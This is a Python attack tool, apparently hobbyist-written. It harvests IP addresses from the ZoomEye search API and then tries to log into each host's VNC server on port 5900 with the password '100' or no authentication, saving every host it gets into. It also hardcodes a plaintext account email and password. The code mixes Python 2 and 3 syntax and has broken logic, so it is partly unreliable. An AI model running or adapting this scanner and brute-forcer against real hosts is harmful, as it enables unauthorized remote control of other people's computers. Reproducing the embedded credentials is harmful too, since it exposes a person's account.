#
#
print ("""
#############################################################|
#------------------------------------------------------------|
#      Sm@rtClient Auto VNC Vulnerability Crawler V.1.3      |
#------------------------------------------------------------|
#############################################################|
""")
#
#
###################################|
#----------------------------------|
# Coded and Compiled by LOOP & ONI |
#----------------------------------|
###################################|
#
# #####-------------------------------#####
# #####*** ZOOMEYE, GATHERING PART ***#####
# #####-------------------------------#####
#############################################
#############################################
#
# 
import pprint
import sys
import json
import requests
import argparse
import signal
import multiprocessing.dummy as mp
from random import randint
import socket
import struct
import Crypto
import des
import cipher
import Crypto.Cipher
from Crypto.Cipher import DES

######## CHANGE THESE  (Or use `--email` and `--password` arguments) #########
USER_EMAIL = "goccikcan@hotmail.com"
USER_PASSWORD = "goccikcan123"
##############################################################################

# general args var instead of using multiple vars
global args

# COLORS !!
RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

# Safely stop the loops in case of CTRL+C
global interrputed
interrputed = False

# CTRL+C handling


def signal_handler(sig, frame):
	print(BLUE + '\n [*] You pressed Ctrl+C!')
	interrputed = True
	sys.exit(1)


signal.signal(signal.SIGINT, signal_handler)


# In case the ZoomEye API URL ever changes
API_URL = "https://api.zoomeye.org"


# Random UA since its required
def getRandomUserAgent():
	user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
				   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
				   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
				   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
				   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
				   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
				   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
				   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
				   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
				   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
				   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
	return user_agents[randint(0, len(user_agents) - 1)]


def getToken():
	print(BLUE + "[*] Logging in as "+args.email)
	headers = {
		'User-Agent': getRandomUserAgent()
	}

	USER_DATA = '{"username": ' + '"' + args.email + '"' + \
				', "password":  ' + '"' + args.password + '"' + '}'

	AUTH_REQUEST = requests.post(
		API_URL + '/user/login', data=USER_DATA, headers=headers)

	try:
		# Wrong credentials
		if(AUTH_REQUEST.status_code == 403):
			raise KeyError
		print("access token: " + AUTH_REQUEST.text)
		ACCESS_TOKEN = AUTH_REQUEST.json()['access_token']
		print(GREEN + "[+] Successfuly logged in")
		return ACCESS_TOKEN
	except KeyError:
		# This isn't supressed in quiet mode because there won't bay any results
		print(RED + "[-] Invalid Credentials, please specify an email and password either in this file or with `--email` and `--password` arguments")
		quit()


def detectSaveMode():
	global resultsFile
	if args.save:
		print(
			BLUE + "[*] All IPs will be saved to " + args.save)
		try:
			# Append file instead of replacing it
			resultsFile = open(args.save, 'a')
		except:
			print(
				RED + "[-] Could not write to " + args.save + ", please check your permissions")
			quit()
	else:
		print(
			BLUE + "[*] All IPs will be saved to " + "results.txt")
		try:
			# Append file instead of replacing it
			resultsFile = open("results.txt", 'a')
		except:
			print(
				RED + "[-] Could not write to " + "results.txt" + ", please check your permissions")
			quit()



def getPage(page):
	# This is the prefixed Token
	global TOKEN
	if not args.save:
		print(BLUE + "[*] Parsing page: " + str(page))
	else:
		# to keep the stdout clean
		print(BLUE + "[*] Parsing page: " + str(page), end=='\r')

	# Moved HEADERS and SEARCH since they are'nt really global

	# Add the prefixed token to the headers, and the user agent
	HEADERS = {"Authorization": TOKEN, "user-agent": getRandomUserAgent()}

	SEARCH = requests.get(API_URL + '/' + args.platform + '/search',
						  headers=HEADERS, params={"query": args.query, "page": page})
	response = json.loads(SEARCH.text)
	i = 0
	try:
		global output
		while i < len(response["matches"]):
			if(interrputed):
				break
			if args.platform == "host":
				if args.port:
					resultItem = response["matches"][i]["ip"] + ":" + \
						str(response["matches"][i]["portinfo"]["port"])
				else:
					resultItem = response["matches"][i]["ip"]

			elif args.platform == "web":
				if args.domain:
					resultItem = response["matches"][i]["site"]
				else:
					resultItem = response["matches"][i]["ip"][0]

			# output array
			output.append(resultItem)

			# clear the current line and print the result
		  
			print(resultItem)
			i += 1
	except IndexError:
		return
	except KeyError:
		print(RED + "[-] No hosts found")
		quit()


# Loopy loop or multithread
def getResult():
	# same output array
	global output
	output = []

	# Get the token, once
	global TOKEN
	TOKEN = "JWT " + getToken()

	# Basic multithreading
	if args.multi:
		p = mp.Pool(10)
		p.map(getPage, range(1, args.pages+1))
	else:
		currentPage = 1
		while currentPage <= args.pages:
			if(interrputed):
				break
			getPage(currentPage)
			currentPage += 1

	global resultsFile
	resultsFile.writelines(["%s\n" % item for item in output])
	


def ipCount():
	global output
	print(GREEN + "[+] " + str(len(output)) + " IPs saved to " + resultsFile.name)


def main():
	parser = argparse.ArgumentParser(
		description='Simple ZoomEye searcher, outputs IPs to stdout or file')

	parser.add_argument("-q", "--query", help="Your ZoomEye Search")
	parser.add_argument(
		"-m", "--multi", help="enable multithreading", action="store_true")
	parser.add_argument(
		"-p", "--pages", help="Number of pages to search (Default: 5)", type=int, default=5)
	parser.add_argument(
		"--email", help="Your ZoomEye email", default=USER_EMAIL)
	parser.add_argument(
		"--password", help="Your ZoomEye password", default=USER_PASSWORD)
	parser.add_argument(
		"-s", "--save", help="Save output to <file>, default file name: results.txt", nargs="?", type=str, const="results.txt")
	parser.add_argument("-pl", "--platform",
						help="Platforms to search, accepts \"host\" and \"web\" (Default: host)", default="host")
	parser.add_argument(
		"--port", help="Include the port number in the results (e.g., 127.0.0.1:1337) (Only for host platform)", action="store_true")
	parser.add_argument(
		"--domain", help="Output the site address rather than the IP. (Only for web platform)", action="store_true")

	global args
	args = parser.parse_args()

	detectSaveMode()
	getResult()


	ipCount()

	# The end
	print(ENDC)


if __name__ == '__main__':
	main()

##################################################################

# #####-------------------------------#####
# ##### *** Sm@rtClient VNC Check *** #####
# ##### **** ( VNC Brute Forcer) **** #####     
# #####-------------------------------#####
#############################################
#############################################
#
#
# return status
# status 0 = success ("none" authentication method)
# status 1 = success (good password)
# status 2 = bad password
# status 3 = bad configuration (wrong version, wrong security type)
# status 4 = bad connection
# status 5 = too many failures
def testvnc(server, port, password, timeout, verbose):
	try:
		ip = socket.gethostbyname(server)
	except socket.error as e:
		print "%s" % e
		return 4

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		s.connect((ip, port))
	except socket.error as e:
		print "Cannot connect to %s:%d" % (ip, port)
		print "%s" % e
		return 4
	print "Connected to %s:%d" % (server, port)


	# 11111
	# first, the server sends its RFB version, 12 bytes
	# more than 12 bytes if too many failures
	try:
		data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
		if verbose:
				print "Received [%d] version:\n%r" % (len(data), data)
	if len(data) > 12:
		return 5
	if data == "RFB 003.003\n":
		version = 3
	elif data == "RFB 003.007\n":
		version = 7
	elif data == "RFB 003.008\n":
		version = 8
	else:
		return 3
	print "RFB Version: 3.%d" % version



	# 22222
	# now, the client sends its RFB version, 12 bytes
	m = data
	if verbose:
		print "Sending [%d] version:\n%r" % (len(m), m)
	try:
		s.send(m)
	except socket.error as e:
		print "%s\n" % e
		return 4



	# 33333
	# now, the server sends the security type[s]
	# in version 3, the server deciDES the security type, 4 bytes
	# in version 3 using RealVNC, the server sends authentication type and challenge in one message, thus recv(4)
	# in version 7/8, the server sends a list of supported security types: number of security types of 1 byte followed by a list of security types of 1 byte each
	try:
		if version == 3:
			data = s.recv(4)
		else:
			data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
		if verbose:
				print "Received [%d] security type[s]:\n%r" % (len(data), data)

	if version == 3:
		security_type = struct.unpack("!I", data)[0]
		# security type 0 == Invalid
		# security type 1 == None
		# security type 2 == VNC
		if security_type == 1:
			return 0
		elif security_type != 2:
			return 3
	else:
		number_of_security_types = struct.unpack("!B", data[0])[0]
		if verbose:
			print "Number of security types: %d" % number_of_security_types
		if number_of_security_types == 0:
			# no security types supported
			return 3
		vnc_enabled = False
		for i in range(1, number_of_security_types + 1):
			if i >= len(data):
				# should not happen, but don't want to cause an exception
				break
			security_type = struct.unpack("!B", data[i])[0]
			# security type 1 = None
			# security type 2 = VNC
			# security type 16 = Tight
			# security type 18 = VNC
			# security type 19 = VeNCrypt
			# plus some more
			if security_type == 1:
				return 0
			elif security_type == 2:
				vnc_enabled = True
		if not vnc_enabled:
			print "VNC security type not supported"
			return 3



		# 44444
		# now, the client selects the VNC (2) security type, 1 byte
		m = struct.pack("!B", 2)
		if verbose:
			print "Sending [%d] security type:\n%r" % (len(m), m)
		try:
			s.send(m)
		except socket.error as e:
			print "%s\n" % e
			return 4


	# 55555
	# now, the server sends the authentication challenge, 16 bytes
	try:
		data = s.recv(16)
	except socket.error as e:
		print "%s" % e
		return 4

	challenge = struct.unpack("!16s", data)[0]
#		if verbose:
#				print "Received [%d] challenge:\n%r" % (len(challenge), challenge)



	# 66666
	# now, the client sends the response, 16 bytes
	key = calc_key(password)
	# encrypt 'challenge' using DES with 'key'
	cipher = DES.new(key, DES.MODE_ECB)
	response = cipher.encrypt(challenge)
	#if verbose:
	#	print "Sending [%d] response:\n%r" % (len(response), response)
	try:
		s.send(response)
	except socket.error as e:
		print "%s\n" % e
		return 4


	# 77777
	# last, the server sends an ok or fail
	# 0 == OK, 1 == failed
	try:
		data = s.recv(1024)
	except socket.error as e:
		print "%s" % e
		return 4
		if verbose:
				print "Received [%d] security result:\n%r" % (len(data), data)
	if len(data) == 0:
		result = struct.unpack("!0s", data[0:4])[0]
		if result == 0:
					# good password
			return 1
		elif result == 1:
			# bad password
			return 2
		else:
			# protocol error
			return 3
	else:
		result = struct.unpack("!I", data[0:4])[0]
		if result == 0:
			# good password
			return 1
		elif result == 1:
			# bad password
			return 2
		else:
		# protocol error
			return 3




def calc_key(password):
	key = password

	# first, pad the key with zeros to 8 bytes
	while len(key) < 8:
		key = key + "\x00"
	if len(key) > 8:
		key = key[:8]

	# second, flip all bytes individually
	flipped_key = ""
	for i in range(0 ,8):
		b = struct.unpack("B", key[i])[0]
		b_new = 0b00000000

		b_mask = 0b10000000
		bit = b & b_mask
		bit = bit >> 7
		b_new = b_new | bit

		b_mask = 0b01000000
		bit = b & b_mask
		bit = bit >> 5
		b_new = b_new | bit

		b_mask = 0b00100000
		bit = b & b_mask
		bit = bit >> 3
		b_new = b_new | bit

		b_mask = 0b00010000
		bit = b & b_mask
		bit = bit >> 1
		b_new = b_new | bit

		b_mask = 0b00001000
		bit = b & b_mask
		bit = bit << 1
		b_new = b_new | bit

		b_mask = 0b00000100
		bit = b & b_mask
		bit = bit << 3
		b_new = b_new | bit

		b_mask = 0b00000010
		bit = b & b_mask
		bit = bit << 5
		b_new = b_new | bit

		b_mask = 0b00000001
		bit = b & b_mask
		bit = bit << 7
		b_new = b_new | bit

		#print bin(b)
		#print bin(b_new)

		flipped_key = flipped_key + struct.pack("B", b_new)

	return flipped_key


#def usage():
#	print "usage: %s SERVER PORT PASSWORD [TIMEOUT [VERBOSE]]" % sys.argv[0]
#	print "typical VNC ports are 5900, 5901, 5902..."

if __name__ == '__main__':
	if len(sys.argv) >= 0:
#		usage()
#	else:

		p=raw_input("page number: ")
		l=[]
		with open("results.txt", "r") as file:
			for x in file:
				l.append(x[:-1])
		t=0
		listnew=[]
		s=(p*20)
		while t<s:
			for i in l:
				server = (i)
				port = int(5900)
				password = ("100")
				timeout = 10
				if len(sys.argv) >= 0:
					timeout = int(10)
				verbose = False
				if len(sys.argv) >= 6 and sys.argv[5].lower() == "true":
					verbose = True

		# status 0 = success (no authentication)
		# status 1 = success (good password)
		# status 2 = bad password
		# status 3 = bad configuration (wrong version, wrong security type)
		# status 4 = bad connection
		# status 5 = too many failures
				status = testvnc(server, port, password, timeout, verbose)
				if status == 0:	
					print "\"None\" authentication method detected"
					listnew.append(i)
				elif status == 1:
					print "Authentication successful"
					listnew.append(i)
				elif status == 2:
					print "Authentication failed"
				elif status == 3:
					print "Protocol error"
				elif status == 4:
					print "Network error"
				elif status == 5:
					print "Too many failures"
								
				print (listnew)
				resclients=open("sm@rts.txt", "w")
				resclients.write(pprint.pformat(listnew) + '\n')

				resclients.close() 


				t=t+1
